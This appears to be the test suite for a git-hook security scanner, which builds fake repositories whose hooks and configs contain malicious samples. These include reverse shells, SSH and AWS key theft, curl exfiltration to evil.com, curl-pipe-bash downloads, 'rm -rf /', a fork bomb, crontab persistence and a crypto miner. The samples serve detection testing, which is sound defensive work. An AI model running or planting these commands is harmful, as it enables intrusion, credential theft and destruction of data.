#!/usr/bin/env python3
"""Tests for hookaudit."""

import os
import stat
import sys
import tempfile
import shutil

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from hookaudit import scan_repo, scan_file, ScanResult, Severity, format_text, format_json

# ── Helpers ─────────────────────────────────────────────────────────

def make_repo(tmpdir: str, hooks: dict = None, gitattributes: str = None,
              gitconfig: str = None, husky: dict = None,
              precommit_config: str = None, lefthook: str = None) -> str:
    """Create a fake git repo structure for testing."""
    repo = os.path.join(tmpdir, "repo")
    os.makedirs(os.path.join(repo, ".git", "hooks"), exist_ok=True)

    if hooks:
        for name, content in hooks.items():
            path = os.path.join(repo, ".git", "hooks", name)
            with open(path, "w") as f:
                f.write(content)
            os.chmod(path, 0o755)

    if gitattributes:
        with open(os.path.join(repo, ".gitattributes"), "w") as f:
            f.write(gitattributes)

    if gitconfig:
        with open(os.path.join(repo, ".git", "config"), "w") as f:
            f.write(gitconfig)

    if husky:
        husky_dir = os.path.join(repo, ".husky")
        os.makedirs(husky_dir, exist_ok=True)
        for name, content in husky.items():
            path = os.path.join(husky_dir, name)
            with open(path, "w") as f:
                f.write(content)
            os.chmod(path, 0o755)

    if precommit_config:
        with open(os.path.join(repo, ".pre-commit-config.yaml"), "w") as f:
            f.write(precommit_config)

    if lefthook:
        with open(os.path.join(repo, "lefthook.yml"), "w") as f:
            f.write(lefthook)

    return repo


def assert_finding(result: ScanResult, rule_id: str, severity: Severity = None) -> None:
    """Assert that a finding with given rule_id exists."""
    matching = [f for f in result.findings if f.rule_id == rule_id]
    assert matching, f"Expected finding {rule_id} but got: {[f.rule_id for f in result.findings]}"
    if severity:
        assert any(f.severity == severity for f in matching), \
            f"Expected {rule_id} with severity {severity.value} but got {[f.severity.value for f in matching]}"


def assert_no_finding(result: ScanResult, rule_id: str) -> None:
    """Assert that no finding with given rule_id exists."""
    matching = [f for f in result.findings if f.rule_id == rule_id]
    assert not matching, f"Unexpected finding {rule_id}: {[f.message for f in matching]}"


# ── Tests ───────────────────────────────────────────────────────────

def test_clean_repo():
    """Clean repo with no hooks should be safe."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir)
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert result.grade == "A+", f"Expected A+ but got {result.grade}"
        assert result.risk_label == "SAFE"
        print("  ✓ test_clean_repo")


def test_reverse_shell_bash():
    """HA001: Detect bash reverse shell."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA001", Severity.CRITICAL)
        print("  ✓ test_reverse_shell_bash")


def test_reverse_shell_netcat():
    """HA001: Detect netcat reverse shell."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-merge": "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA001", Severity.CRITICAL)
        print("  ✓ test_reverse_shell_netcat")


def test_credential_theft_ssh():
    """HA002: Detect SSH key theft."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\ntar czf /tmp/keys.tar.gz ~/.ssh/\ncurl -X POST -d @/tmp/keys.tar.gz http://evil.com\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA002", Severity.CRITICAL)
        print("  ✓ test_credential_theft_ssh")


def test_credential_theft_aws():
    """HA002: Detect AWS credential theft."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-commit": "#!/bin/bash\ncp ~/.aws/credentials /tmp/\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA002", Severity.CRITICAL)
        print("  ✓ test_credential_theft_aws")


def test_exfiltration_curl_post():
    """HA003: Detect curl POST exfiltration."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-commit": "#!/bin/bash\ncurl -d \"data=$(whoami)\" http://evil.com/collect\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA003", Severity.HIGH)
        print("  ✓ test_exfiltration_curl_post")


def test_download_and_execute():
    """HA004: Detect curl|sh pattern."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\ncurl http://evil.com/payload.sh | bash\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA004", Severity.CRITICAL)
        print("  ✓ test_download_and_execute")


def test_obfuscation_base64():
    """HA005: Detect base64 decode to shell."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-push": "#!/bin/bash\necho 'cm0gLXJmIH4v' | base64 --decode | bash\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA005", Severity.HIGH)
        print("  ✓ test_obfuscation_base64")


def test_obfuscation_eval():
    """HA005: Detect eval of variable."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-commit": '#!/bin/bash\ncmd="rm -rf /"\neval "$cmd"\n'
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA005", Severity.HIGH)
        print("  ✓ test_obfuscation_eval")


def test_dangerous_commands():
    """HA006: Detect rm -rf /."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\nrm -rf /\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA006", Severity.CRITICAL)
        print("  ✓ test_dangerous_commands")


def test_fork_bomb():
    """HA006: Detect fork bomb."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-commit": "#!/bin/bash\n:(){ :|:& };:\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA006", Severity.CRITICAL)
        print("  ✓ test_fork_bomb")


def test_privilege_escalation():
    """HA007: Detect sudo in hooks."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-commit": "#!/bin/bash\nsudo apt-get install something\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA007", Severity.HIGH)
        print("  ✓ test_privilege_escalation")


def test_env_exfiltration():
    """HA008: Detect env piped to curl."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-commit": "#!/bin/bash\nenv | curl -X POST -d @- http://evil.com\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA008", Severity.CRITICAL)
        print("  ✓ test_env_exfiltration")


def test_background_process():
    """HA009: Detect nohup background process."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\nnohup /tmp/miner &\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA009", Severity.MEDIUM)
        print("  ✓ test_background_process")


def test_crontab_modification():
    """HA009: Detect crontab modification."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA009", Severity.MEDIUM)
        print("  ✓ test_crontab_modification")


def test_filesystem_modification():
    """HA010: Detect shell profile modification."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\necho 'export PATH=/tmp/evil:$PATH' >> ~/.bashrc\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA010", Severity.HIGH)
        print("  ✓ test_filesystem_modification")


def test_crypto_mining():
    """HA011: Detect crypto miner."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": "#!/bin/bash\nxmrig --url stratum+tcp://pool.mining.com:3333 --user wallet\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA011", Severity.CRITICAL)
        print("  ✓ test_crypto_mining")


def test_gitattributes_filter():
    """HA012: Detect filter driver in .gitattributes."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitattributes="*.py filter=evil\n")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA012", Severity.HIGH)
        print("  ✓ test_gitattributes_filter")


def test_gitconfig_fsmonitor():
    """HA013: Detect fsmonitor in git config."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitconfig="[core]\n\tfsmonitor = /tmp/evil.sh\n")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA013", Severity.CRITICAL)
        print("  ✓ test_gitconfig_fsmonitor")


def test_gitconfig_hookspath():
    """HA013: Detect custom hooksPath."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitconfig="[core]\n\thooksPath = /tmp/evil-hooks\n")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA013", Severity.HIGH)
        print("  ✓ test_gitconfig_hookspath")


def test_gitconfig_credential_helper():
    """HA013: Detect suspicious credential helper."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitconfig='[credential]\n\thelper = /tmp/steal-creds.sh\n')
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA013", Severity.HIGH)
        print("  ✓ test_gitconfig_credential_helper")


def test_gitconfig_embedded_creds():
    """HA013: Detect embedded credentials in URL."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitconfig='[remote "origin"]\n\turl = https://user:password123@github.com/org/repo.git\n')
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA013", Severity.HIGH)
        print("  ✓ test_gitconfig_embedded_creds")


def test_husky_hooks():
    """HA014: Scan husky hooks for dangerous patterns."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, husky={
            "pre-commit": "#!/bin/sh\ncurl http://evil.com/payload | bash\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA004", Severity.CRITICAL)
        print("  ✓ test_husky_hooks")


def test_precommit_untrusted_repo():
    """HA015: Detect untrusted pre-commit repo."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, precommit_config="""
repos:
  - repo: https://evil.example.com/hooks
    rev: v1.0
    hooks:
      - id: evil-hook
""")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA015", Severity.MEDIUM)
        print("  ✓ test_precommit_untrusted_repo")


def test_precommit_dangerous_entry():
    """HA015: Detect dangerous entry in pre-commit config."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, precommit_config="""
repos:
  - repo: local
    hooks:
      - id: backdoor
        name: backdoor
        entry: curl http://evil.com/payload.sh | bash
        language: system
""")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA015", Severity.CRITICAL)
        print("  ✓ test_precommit_dangerous_entry")


def test_safe_hook():
    """Normal lint hooks should not trigger findings."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-commit": """#!/bin/bash
set -e
echo "Running linters..."
black --check .
ruff check .
mypy src/
echo "All checks passed!"
"""
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        # Only HA017 (info) should trigger
        non_info = [f for f in result.findings if f.severity != Severity.INFO]
        assert not non_info, f"Safe hook triggered findings: {[(f.rule_id, f.message) for f in non_info]}"
        print("  ✓ test_safe_hook")


def test_sample_hooks_ignored():
    """.sample hooks should be skipped."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir)
        sample_path = os.path.join(repo, ".git", "hooks", "pre-commit.sample")
        with open(sample_path, "w") as f:
            f.write("#!/bin/bash\ncurl http://evil.com | bash\n")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_no_finding(result, "HA004")
        print("  ✓ test_sample_hooks_ignored")


def test_single_file_scan():
    """Scan a single hook file."""
    with tempfile.TemporaryDirectory() as tmpdir:
        hook_file = os.path.join(tmpdir, "pre-commit")
        with open(hook_file, "w") as f:
            f.write("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        from pathlib import Path
        result = scan_file(Path(hook_file))
        assert_finding(result, "HA001", Severity.CRITICAL)
        print("  ✓ test_single_file_scan")


def test_json_output():
    """JSON output should be valid."""
    import json as json_mod
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-commit": "#!/bin/bash\ncurl http://evil.com | bash\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        output = format_json(result)
        data = json_mod.loads(output)
        assert "grade" in data
        assert "findings" in data
        assert data["score"] > 0
        print("  ✓ test_json_output")


def test_combined_attack():
    """Multiple attack vectors in one hook should all be caught."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "post-checkout": """#!/bin/bash
# Steal SSH keys
tar czf /tmp/keys.tar.gz ~/.ssh/
# Exfiltrate via curl
curl -X POST -d @/tmp/keys.tar.gz http://evil.com/collect
# Install persistence
echo '* * * * * curl http://evil.com/beacon' | crontab -
# Mine crypto
nohup xmrig --url stratum+tcp://pool.mining.com:3333 &
"""
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA002")  # Credential theft
        assert_finding(result, "HA003")  # Exfiltration
        assert_finding(result, "HA009")  # Background/crontab
        assert_finding(result, "HA011")  # Crypto mining
        assert result.grade == "F", f"Expected F but got {result.grade}"
        print("  ✓ test_combined_attack")


def test_gitattributes_diff_driver():
    """HA012: Detect diff driver in .gitattributes."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitattributes="*.pdf diff=pdf\n*.doc diff=antiword\n")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA012", Severity.MEDIUM)
        print("  ✓ test_gitattributes_diff_driver")


def test_env_token_exfil():
    """HA008: Detect secret env var sent to network."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, hooks={
            "pre-push": "#!/bin/bash\ncurl http://evil.com/?token=$GITHUB_TOKEN\n"
        })
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA008", Severity.CRITICAL)
        print("  ✓ test_env_token_exfil")


def test_filter_clean_smudge():
    """HA013: Detect filter clean/smudge in git config."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo = make_repo(tmpdir, gitconfig="""[filter "evil"]
\tclean = /tmp/steal-code.sh %f
\tsmudge = /tmp/inject-backdoor.sh %f
""")
        from pathlib import Path
        result = scan_repo(Path(repo))
        assert_finding(result, "HA013", Severity.HIGH)
        print("  ✓ test_filter_clean_smudge")


# ── Run ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    tests = [
        test_clean_repo,
        test_reverse_shell_bash,
        test_reverse_shell_netcat,
        test_credential_theft_ssh,
        test_credential_theft_aws,
        test_exfiltration_curl_post,
        test_download_and_execute,
        test_obfuscation_base64,
        test_obfuscation_eval,
        test_dangerous_commands,
        test_fork_bomb,
        test_privilege_escalation,
        test_env_exfiltration,
        test_background_process,
        test_crontab_modification,
        test_filesystem_modification,
        test_crypto_mining,
        test_gitattributes_filter,
        test_gitconfig_fsmonitor,
        test_gitconfig_hookspath,
        test_gitconfig_credential_helper,
        test_gitconfig_embedded_creds,
        test_husky_hooks,
        test_precommit_untrusted_repo,
        test_precommit_dangerous_entry,
        test_safe_hook,
        test_sample_hooks_ignored,
        test_single_file_scan,
        test_json_output,
        test_combined_attack,
        test_gitattributes_diff_driver,
        test_env_token_exfil,
        test_filter_clean_smudge,
    ]

    passed = 0
    failed = 0
    errors = []

    print(f"\nRunning {len(tests)} tests...\n")

    for test in tests:
        try:
            test()
            passed += 1
        except Exception as e:
            failed += 1
            errors.append((test.__name__, str(e)))
            print(f"  ✗ {test.__name__}: {e}")

    print(f"\n{'─' * 40}")
    print(f"  Passed: {passed}/{len(tests)}")
    if failed:
        print(f"  Failed: {failed}")
        for name, err in errors:
            print(f"    {name}: {err}")
        sys.exit(1)
    else:
        print("  All tests passed! ✓")
        sys.exit(0)
